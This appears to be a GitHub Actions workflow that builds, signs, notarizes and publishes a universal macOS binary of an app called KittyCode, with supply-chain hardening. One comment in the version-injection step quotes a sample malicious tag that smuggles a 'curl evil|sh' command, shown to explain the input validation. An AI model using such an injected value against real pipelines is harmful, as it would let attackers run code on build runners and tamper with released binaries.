name: KittyCode release

# Triggered on every `kittycode/vX.Y.Z` tag push (the umbrella holds two apps, so release tags carry the app's
# name). Builds a universal binary,
# optionally codesigns + notarizes if the relevant secrets are
# configured, packages it as a zip, and attaches it to a GitHub
# release. Without signing secrets the workflow still produces a
# usable binary — Gatekeeper will require explicit allow on first
# run, but the artifact itself is valid. Audit D9.

on:
  push:
    tags: ['kittycode/v*']

permissions:
  contents: write       # needed for `gh release create`
  id-token: write       # SLSA attestation OIDC token (audit A.5/F2)
  attestations: write   # `actions/attest-build-provenance` writes here

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  release:
    runs-on: macos-26
    defaults:
      run:
        working-directory: Apps/KittyCode
    steps:
      # Actions are pinned to commit SHAs (not version tags). A tag
      # rewrite on either upstream repo cannot inject malicious code
      # into this workflow. Update the SHAs deliberately when bumping
      # versions; the trailing comment carries the intended tag for
      # readability. Audit A.5/F2.
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

      # The package declares tools 6.4; no hosted macOS image ships that toolchain yet, so the family's
      # setup-swift action installs the pinned swift.org snapshot.
      - uses: Aemi-Studio/aemi/.github/actions/setup-swift@main

      - name: Inject release version
        # `RAW_REF` is set via `env:` so the tag is substituted into the
        # process environment as a single string, not interpolated by
        # GitHub Actions into the shell script body where it would be
        # parsed by bash. Without this, a tag like
        # `v1.0.0";system("curl evil|sh");//` would inject arbitrary
        # commands at the runner (audit F1 — shell injection) AND land
        # in `Version.swift` as Swift code (Swift injection — second
        # vector against the release binary users download).
        # The regex allowlist refuses anything that isn't a strict
        # `vMAJOR.MINOR.PATCH(-suffix)?` semver-ish tag. `printf` (not
        # heredoc) prevents Swift-string termination via `"` in the
        # version number even after the regex passes.
        env:
          RAW_REF: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          case "$RAW_REF" in
            kittycode/v[0-9]*.[0-9]*.[0-9]*) ;;
            *)
              echo "Refusing to inject non-semver tag: $RAW_REF" >&2
              exit 1
              ;;
          esac
          VERSION_NUMBER="${RAW_REF#kittycode/v}"
          # Defense in depth: refuse if the stripped version contains anything
          # other than `[0-9A-Za-z.+-]` (the SemVer 2.0 grammar).
          if printf '%s' "$VERSION_NUMBER" | grep -q '[^0-9A-Za-z.+-]'; then
            echo "Refusing version with disallowed characters: $VERSION_NUMBER" >&2
            exit 1
          fi
          printf '// Generated by .github/workflows/release.yml from tag %s.\n// Do not commit changes to this file; the release workflow\n// overwrites it on every tagged build.\npublic enum BuildVersion {\n    public static let release = "%s"\n}\n' \
            "$RAW_REF" "$VERSION_NUMBER" > Sources/KittyEditor/Version.swift
          echo "Injected version: $VERSION_NUMBER"

      - name: Build universal binary
        run: swift build -c release --arch arm64 --arch x86_64

      - name: Locate binary
        id: locate
        run: |
          BIN_DIR=$(swift build -c release --arch arm64 --arch x86_64 --show-bin-path)
          BIN="$BIN_DIR/KittyCode"
          test -x "$BIN" || { echo "binary missing at $BIN"; exit 1; }
          echo "binary=$BIN" >> "$GITHUB_OUTPUT"
          file "$BIN"
          lipo -info "$BIN"

      - name: Codesign (skipped if SIGNING_IDENTITY secret is unset)
        env:
          SIGNING_IDENTITY: ${{ secrets.SIGNING_IDENTITY }}
        if: env.SIGNING_IDENTITY != ''
        run: |
          codesign --force --options runtime --timestamp \
            --sign "$SIGNING_IDENTITY" "${{ steps.locate.outputs.binary }}"
          codesign --verify --strict --verbose=2 "${{ steps.locate.outputs.binary }}"

      - name: Package zip
        id: package
        env:
          RAW_REF: ${{ github.ref_name }}
        run: |
          VERSION="${RAW_REF#kittycode/}"
          ZIP_NAME="kittycode-${VERSION}-macos-universal.zip"
          ZIP="$RUNNER_TEMP/$ZIP_NAME"
          # `ditto -c -k --keepParent` is what `xcrun notarytool` accepts.
          ditto -c -k --keepParent "${{ steps.locate.outputs.binary }}" "$ZIP"
          echo "zip=$ZIP" >> "$GITHUB_OUTPUT"
          echo "zip_name=$ZIP_NAME" >> "$GITHUB_OUTPUT"
          SHA=$(shasum -a 256 "$ZIP" | cut -d' ' -f1)
          echo "sha256=$SHA" >> "$GITHUB_OUTPUT"
          echo "Packaged $ZIP_NAME ($SHA)"

      - name: Notarize (skipped if NOTARY_APPLE_ID secret is unset)
        env:
          NOTARY_APPLE_ID: ${{ secrets.NOTARY_APPLE_ID }}
          NOTARY_PASSWORD: ${{ secrets.NOTARY_PASSWORD }}
          NOTARY_TEAM_ID: ${{ secrets.NOTARY_TEAM_ID }}
        if: env.NOTARY_APPLE_ID != ''
        run: |
          xcrun notarytool submit "${{ steps.package.outputs.zip }}" \
            --apple-id "$NOTARY_APPLE_ID" \
            --password "$NOTARY_PASSWORD" \
            --team-id "$NOTARY_TEAM_ID" \
            --wait
          # Stapling on bare executables isn't supported; Gatekeeper
          # verifies notarization online on first run.

      - name: Attest build provenance (SLSA)
        # Produces a signed predicate that ties the release artifact to
        # this exact workflow run (commit SHA, runner identity, build
        # inputs). Verifiable post-download via `gh attestation verify`
        # — closes the supply-chain gap flagged in audit F2.
        uses: actions/attest-build-provenance@977bb373ede98d70efdf65b84cb5f73e068dcc2a  # v2.4.0
        with:
          subject-path: ${{ steps.package.outputs.zip }}

      - name: Create GitHub release
        env:
          GH_TOKEN: ${{ github.token }}
          RAW_REF: ${{ github.ref_name }}
        run: |
          # `--generate-notes` produces a "What's Changed" section by
          # diffing commit titles since the previous tag. Override by
          # editing the release on GitHub afterwards if you want a
          # hand-written changelog.
          gh release create "${{ github.ref_name }}" \
            "${{ steps.package.outputs.zip }}" \
            --title "KittyCode ${RAW_REF#kittycode/}" \
            --generate-notes

      - name: Summary
        env:
          RAW_REF: ${{ github.ref_name }}
        run: |
          {
            echo "## KittyCode ${RAW_REF#kittycode/}"
            echo ""
            echo "- Binary: \`${{ steps.package.outputs.zip_name }}\`"
            echo "- SHA-256: \`${{ steps.package.outputs.sha256 }}\`"
            echo "- Architectures: arm64 + x86_64 (universal)"
            echo ""
            echo "### Homebrew formula snippet"
            echo "\`\`\`ruby"
            echo "url \"https://github.com/${{ github.repository }}/releases/download/${{ github.ref_name }}/${{ steps.package.outputs.zip_name }}\""
            echo "sha256 \"${{ steps.package.outputs.sha256 }}\""
            echo "\`\`\`"
          } >> "$GITHUB_STEP_SUMMARY"
